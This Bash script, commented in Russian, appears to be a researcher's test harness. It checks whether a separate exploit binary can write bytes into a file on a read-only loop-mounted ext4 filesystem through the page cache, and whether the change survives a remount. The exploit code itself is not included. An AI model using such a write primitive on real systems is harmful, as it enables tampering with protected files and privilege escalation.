#!/bin/bash
# F2b: примитив на файловой системе, смонтированной только для чтения
set -u
cd ~/exploit

echo "=== F2b: отдельная RO-файловая система (loop ext4) ==="
dd if=/dev/zero of=/tmp/fs.img bs=1M count=16 2>/dev/null
mkfs.ext4 -q /tmp/fs.img
sudo mkdir -p /mnt/rofs
sudo mount /tmp/fs.img /mnt/rofs
sudo bash -c 'head -c 1200 /dev/urandom > /mnt/rofs/target && chmod 644 /mnt/rofs/target'
sudo sync
sudo mount -o remount,ro /mnt/rofs
mount | grep " $PWD\|/mnt/rofs" | grep -o "ro,"
echo "--- запуск эксплоита на RO-фс:"
./exploit /mnt/rofs/target 100 deadbeef 2>&1 | grep -E "теперь|\[-\]|примитив"
python3 - <<'EOF'
d = open("/mnt/rofs/target", "rb").read()
print("через кэш, deadbeef на:", d.find(bytes.fromhex("deadbeef")))
EOF
echo "--- перемонтирование (страницы вытеснены, чтение с диска):"
sudo umount /mnt/rofs
sudo mount -o loop,ro /tmp/fs.img /mnt/rofs
python3 - <<'EOF'
d = open("/mnt/rofs/target", "rb").read()
print("после перемонтирования, deadbeef на:", d.find(bytes.fromhex("deadbeef")))
EOF
sudo umount /mnt/rofs
rm -f /tmp/fs.img
